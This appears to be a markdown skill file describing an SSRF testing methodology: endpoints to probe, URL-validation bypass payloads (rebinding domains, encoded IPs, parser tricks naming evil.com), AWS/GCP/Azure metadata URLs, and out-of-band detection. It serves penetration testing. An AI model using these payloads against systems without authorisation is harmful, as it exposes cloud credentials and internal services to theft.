---
name: ssrf-testing
description: "SSRF testing methodology — blind to full response, cloud metadata, DNS rebinding, URL validation bypass, two-phase testing."
version: 1.0.0
---

# SSRF Testing

## Finding SSRF Candidates
Look for endpoints that fetch external URLs:
- Webhooks
- Import/export functionality
- Avatar/profile picture uploads
- PDF generation
- Link previews/embeds
- API proxies/gateways
- SSO/SAML ACS URLs

## Attack Vectors

### 1. URL Validation Bypass
```bash
# DNS rebinding domains
http://localtest.me:8080
http://lvh.me:8080
http://{id}.nip.io:8080
http://{id}.sslip.io:8080

# IPv6 mapped IPv4
http://[::ffff:192.168.1.1]:8080

# URL parser differentials
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
http://evil.com\@127.0.0.1

# Redirect chains
Public URL → 302 → private URL

# Octal/hex IP
http://0300.0250.0.1:8080  # 192.168.0.1
http://0xC0.0xA8.0x00.0x01
```

### 2. Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 3. Two-Phase Testing
Webhooks/connectors have TWO validation phases:
- **Phase A (creation)**: URL format check when configuring — often weaker
- **Phase B (execution)**: Connection-level check when firing — stronger

Test each independently.

### 4. Blind SSRF → Full SSRF
- Use interact.sh or Burp Collaborator for out-of-band detection
- Chain with a service that echoes request body
- Test if you can capture the response
